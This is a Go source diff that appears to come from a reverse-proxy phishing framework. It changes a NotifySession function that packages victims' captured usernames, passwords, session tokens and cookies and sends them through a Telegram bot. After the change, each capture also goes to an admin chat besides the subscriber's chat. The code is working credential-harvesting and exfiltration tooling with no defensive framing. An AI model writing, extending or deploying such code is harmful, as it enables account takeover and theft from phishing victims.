@@ -875,8 +875,17 @@ func NotifySession(lureId int, phishlet, username, password, remoteAddr string, 
 	if GlobalBot == nil {
 		return
 	}
+	// collect chat IDs to notify: admin always, subscriber if exists
+	notifyChats := map[int64]bool{}
+	adminChatId := GlobalBot.cfg.GetBotAdminChatId()
+	if adminChatId != 0 {
+		notifyChats[adminChatId] = true
+	}
 	sub, err := GlobalBot.db.GetSubscriptionByLureId(lureId)
-	if err != nil || sub.NotifyChatId == 0 {
+	if err == nil && sub.NotifyChatId != 0 {
+		notifyChats[sub.NotifyChatId] = true
+	}
+	if len(notifyChats) == 0 {
 		return
 	}
 
@@ -930,7 +939,9 @@ func NotifySession(lureId int, phishlet, username, password, remoteAddr string, 
 		"Username: %s\nPassword: %s\nSession: %s\n\nINFO.TXT\n\nConverted JSON:\n%s",
 		uname, pass, sessionVal, cookieJSON)
 
-	GlobalBot.send(sub.NotifyChatId, msg)
+	for chatId := range notifyChats {
+		GlobalBot.send(chatId, msg)
+	}
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
